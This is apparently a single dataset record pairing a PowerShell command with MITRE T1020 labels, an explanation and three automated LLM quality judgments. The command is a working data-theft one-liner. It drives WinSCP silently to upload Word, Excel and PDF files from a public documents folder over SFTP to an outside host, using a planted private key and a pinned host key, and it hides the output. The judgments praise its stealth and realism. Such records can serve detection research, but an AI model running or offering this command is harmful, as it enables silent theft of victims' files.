command: $r="/keys/"; & 'C:\Program Files (x86)\WinSCP\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil@198.51.100.60/ -privatekey="C:\ProgramData\svc\id_ed25519.ppk" -hostkey="ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="' ("put -preservetime -resume C:\Users\Public\Documents\* `"$r`" -filemask=`"*.docx;*.xlsx;*.pdf|thumbs.db;|*.tmp`"") 'exit' | Out-Null 2>$null
explanation: Performs automated SFTP exfiltration using key-based authentication, targeting specific document types and excluding common noise.
rationale_steps: Use private key authentication to avoid password prompts
Pin server host key to prevent interactive trust prompts
Filter file types with filemask and upload with resume

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quoting/parentheses, correct use of the invocation operator, valid WinSCP.com switches, properly escaped inner quotes, and valid redirections.
llm_judgments.semantic_justification: It automates SFTP exfiltration of selected document types from C:\Users\Public\Documents to a remote path using key-based auth, non-interactive options, file masks, and output suppression, aligning with T1020.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with proper quoting and escaping, though the dynamic string interpolation mixing backtick escapes inside a parenthesized string passed to WinSCP.com introduces minor complexity that could cause edge-case parsing issues.
llm_judgments.semantic_justification: The command precisely implements automated exfiltration (T1020) using WinSCP for SFTP transfer with key-based authentication, targets specific document types (docx, xlsx, pdf) while excluding noise files, uses resume and preserve-time flags for reliability, and suppresses output to avoid detection — all operationally realistic behaviors.

llm_judgments.syntactic_justification: The command correctly uses the PowerShell call operator, handles path quoting, and utilizes backtick escaping for nested quotes and variable interpolation within the WinSCP command string.
llm_judgments.semantic_justification: The command accurately implements automated exfiltration (T1020) by using a scriptable console version of WinSCP, key-based authentication for non-interactive access, and specific file filters to target sensitive data while ignoring noise.
